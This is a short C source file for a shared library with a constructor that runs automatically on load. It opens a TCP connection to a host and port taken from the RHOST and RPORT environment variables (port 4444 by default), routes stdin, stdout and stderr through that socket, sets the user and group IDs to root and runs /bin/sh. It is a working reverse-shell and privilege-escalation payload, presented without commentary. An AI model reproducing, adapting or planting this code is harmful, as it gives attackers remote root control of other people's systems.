#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_REVERSE_ACTIVE")) return;
    
    const char* host = getenv("RHOST");
    const char* port_str = getenv("RPORT");
    if (!host) return;
    
    int port = port_str ? atoi(port_str) : 4444;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return;
    }
    
    setenv("SHELL_REVERSE_ACTIVE", "1", 1);
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    close(sockfd);
    
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    execl("/bin/sh", "sh", NULL);
}